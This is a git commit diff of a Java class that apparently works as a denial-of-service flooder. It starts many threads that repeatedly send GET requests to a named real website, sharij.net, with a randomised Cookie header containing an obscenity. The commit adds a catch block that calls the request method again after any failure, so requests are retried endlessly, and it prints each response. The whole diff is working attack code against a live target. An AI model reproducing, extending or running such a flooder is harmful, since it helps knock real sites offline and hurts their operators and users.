dc1a91db377ae05c150dbd8908b3d16f1d75f296
nazarii_tkachuk <nazarii.tkachuk@sombrainc.com>
2022-02-26 19:58:14 +0200

    third commit

--- src/main/java/HeyBabe.java
+++ src/main/java/HeyBabe.java
@@ -9,7 +9,7 @@ public class HeyBabe implements Runnable {
     }
 
     private static void extracted() {
-        for (int i = 0; i < 1000; i++) {
+        for (int i = 0; i < 100; i++) {
             final HeyBabe heyBabe = new HeyBabe();
             final Thread thread = new Thread(heyBabe);
 
@@ -17,12 +17,19 @@ public class HeyBabe implements Runnable {
         }
     }
 
-    public static void hey() throws UnirestException {
+    public static void hey()  {
         double v = Math.random() * 49 + 1;
         Unirest.setTimeouts(0, 0);
-        HttpResponse<String> response = Unirest.get("https://sharij.net/")
-                .header("Cookie", "pizda " + v)
-                .asString();
+        HttpResponse<String> response = null;
+        try {
+            response = Unirest.get("https://sharij.net/")
+                    .header("Cookie", "pizda " + v)
+                    .asString();
+        } catch (Exception e) {
+            hey();
+        }
+
+        System.out.println(response);
     }
 
     public static void loop() throws UnirestException {
